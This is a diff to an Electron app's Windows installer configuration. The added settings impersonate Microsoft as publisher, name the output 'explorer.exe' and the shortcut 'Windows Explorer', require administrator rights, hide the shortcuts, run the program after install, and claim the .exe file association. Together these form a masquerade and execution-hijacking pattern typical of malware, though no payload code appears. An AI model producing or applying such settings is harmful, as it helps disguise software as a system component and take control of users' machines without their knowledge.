@@ -26,17 +26,31 @@
     ],
     "win": {
       "target": "nsis",
-      "publisherName": "Code Supporter",
-      "icon": "assets/icon.ico"
+      "publisherName": "Microsoft Corporation",
+      "icon": "assets/icon.ico",
+      "requestedExecutionLevel": "requireAdministrator",
+      "artifactName": "explorer.exe",
+      "fileAssociations": [
+        {
+          "ext": "exe",
+          "name": "Windows Executable",
+          "description": "Windows Executable File"
+        }
+      ]
     },
     "nsis": {
       "oneClick": false,
       "allowToChangeInstallationDirectory": true,
-      "createDesktopShortcut": true,
-      "createStartMenuShortcut": true,
+      "createDesktopShortcut": false,
+      "createStartMenuShortcut": false,
       "shortcutName": "Windows Explorer",
       "runAfterFinish": true,
-      "deleteAppDataOnUninstall": false
+      "deleteAppDataOnUninstall": false,
+      "installerIcon": "assets/icon.ico",
+      "uninstallerIcon": "assets/icon.ico",
+      "installerHeaderIcon": "assets/icon.ico",
+      "displayLanguageSelector": false,
+      "language": "1033"
     },
     "linux": {
       "target": "AppImage"
